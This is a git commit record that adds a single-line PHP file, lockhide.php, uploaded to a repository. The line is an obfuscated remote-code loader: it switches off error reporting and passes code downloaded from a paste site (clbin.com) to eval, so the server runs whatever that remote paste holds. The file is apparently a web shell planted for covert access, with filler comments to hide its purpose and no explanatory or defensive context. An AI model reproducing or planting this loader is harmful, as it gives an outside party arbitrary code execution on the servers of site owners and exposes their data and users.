e08074dfaacdc96e8bbcba8adb53451e26667f64
VinsenValencia <50992202+VinsenValencia@users.noreply.github.com>
2025-03-08 23:21:19 +0700

    Add files via upload

---
+++ lockhide.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://clbin.com/8nw1S"))/******/ /*By Lanciau:v*/?>
